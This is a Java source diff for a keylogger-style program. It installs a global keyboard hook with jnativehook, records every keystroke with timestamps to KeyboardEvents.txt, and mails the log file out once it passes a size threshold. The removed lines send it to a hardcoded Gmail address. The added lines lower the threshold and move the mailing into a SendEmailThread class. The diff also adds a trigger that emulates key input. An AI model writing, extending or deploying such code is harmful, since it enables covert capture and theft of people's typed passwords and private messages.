@@ -6,6 +6,7 @@ import logic.QueueBuffer;
 import logic.TimeManager;
 import logs.FileLogWriter;
 import logs.SendEmail;
+import logs.SendEmailThread;
 import main.Main;
 import main.SettingWindow;
 import org.jnativehook.GlobalScreen;
@@ -13,22 +14,25 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import java.io.File;
 import java.util.concurrent.Callable;
 
 public class GlobalKeyListener implements NativeKeyListener{
 
     private FileLogWriter writer = new FileLogWriter("KeyboardEvents.txt");
     private QueueBuffer<Character> buf = new QueueBuffer<>(5);
-    private long fileSize = 0;
+    private long fileSize = 0, maxFileSize=5000;
 
-    public void setFileSize(long fileSize){
-        this.fileSize = fileSize;
+    public void setFileSize(long maxFileSize){
+        this.maxFileSize = maxFileSize;
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
-        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
+        System.out.println("Key Pressed: " + key);
         save(e, "Pressed");
-        buf.add(NativeKeyEvent.getKeyText(e.getKeyCode()).charAt(0));
+        if(key.length()==1) buf.add(key.charAt(0));
+        else buf.add(' ');
         if (buf.toString().equals("BREAK")) { //if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE)
             try {
                 GlobalScreen.unregisterNativeHook();
@@ -38,6 +42,9 @@ public class GlobalKeyListener implements NativeKeyListener{
         }
         if (buf.toString().equals("START")) {
             Main.run();
+        }
+        if(key.charAt(0) == 'A'){
+            KeyboardEmulator.put();
         }
     }
 
@@ -55,17 +62,12 @@ public class GlobalKeyListener implements NativeKeyListener{
         String str = TimeManager.getTime() + "\t" + message + ": " + e.getKeyCode() + " " + NativeKeyEvent.getKeyText(e.getKeyCode());
         writer.write(str);
         fileSize+=str.length();
-        if(fileSize>100000){
-            fileSize=0;
-            Thread sendMailThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    String res = SendEmail.send("bsuir.dmitriy.dronov@gmail.com","Keyboard events", "KeyboardEvents.txt");
-                    if(res.equals("Done")) writer.flush();
-                }
-            });
-            sendMailThread.start();
-
+        if(fileSize>maxFileSize){
+            if(new File("KeyboardEvents.txt").length()>maxFileSize){
+                fileSize=0;
+                SendEmailThread smt = new SendEmailThread(writer);
+                smt.run();
+            }
         }
     }
 
